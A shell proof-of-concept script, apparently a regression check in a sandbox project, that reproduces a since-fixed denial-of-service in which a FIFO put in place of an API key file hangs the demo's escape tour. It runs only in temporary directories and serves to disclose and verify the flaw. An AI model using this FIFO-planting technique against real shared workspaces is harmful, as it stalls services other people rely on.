#!/bin/sh
# FIXED in ebfc00d (tour.sh reads keys/api.key only if it is a regular file, with a 1 s timeout).
# PoC: the escape tour (web/tour.sh) reads /work/keys/api.key with a plain
# `head -c 9`. A previously-APPLIED hostile proposal can replace that path in
# the shared demo workspace with a FIFO (escrow's apply recreates fifos --
# src/apply.c:221 mkfifoat). The next tour then blocks forever on the open(),
# and the web server SIGKILLs it at RUN_TIMEOUT (120s). Persistent DoS of the
# security demo, and it renders the jail's own escape tour as "broken".
#
# This runs ONLY as the sandboxed command, against mktemp dirs. It builds the
# exact argv web/server.py tour() uses. We place the FIFO directly (the end
# state apply would produce) so no signing keys are needed.
#
# usage: tour_fifo_dos.sh /path/to/escrow /path/to/role-test  [timeout_secs]
set -u
ESCROW=$1 ROLE=$2 T=${3:-15}
REPO=$(cd "$(dirname "$0")/../../.." && pwd)
TOUR=$(cat "$REPO/web/tour.sh")
ENVDIR=$(sed -n 's/^env //p' "$ROLE")
CASES="$ENVDIR/share/escrow-tests/escape"
NSTORE=$(grep -c '^store ' "$ROLE")

run_tour() {           # $1 = workspace
  ST=$(mktemp -d); PWNED="poc-pwned-$$"
  ESCROW_STATE="$ST" ESCAPE_SECRET=canary \
    timeout "$T" "$ESCROW" --role "$ROLE" --workspace "$1" -- \
      bash -c "$TOUR" tour "$CASES" "$HOME" "$PWNED" "$$" "$NSTORE" \
      >"$ST/out" 2>"$ST/err"
  code=$?
  echo "  exit=$code (124 = timeout/SIGKILL == DoS)"
  id=$(sed -n 's#.*runs/\([A-Za-z0-9]\{6\}\).*#\1#p' "$ST/err" | head -1)
  [ -n "$id" ] && echo "  last log line: $(tail -1 "$ST/runs/$id/log" 2>/dev/null)"
  rm -rf "$ST"
}

echo "== baseline: clean workspace =="
W1=$(mktemp -d); cp -r "$REPO/demo/ops/." "$W1/"
run_tour "$W1"

echo "== poisoned: keys/api.key replaced by a FIFO (what apply would leave) =="
W2=$(mktemp -d); cp -r "$REPO/demo/ops/." "$W2/"
rm -f "$W2/keys/api.key"; mkfifo "$W2/keys/api.key"
run_tour "$W2"

rm -rf "$W1" "$W2"
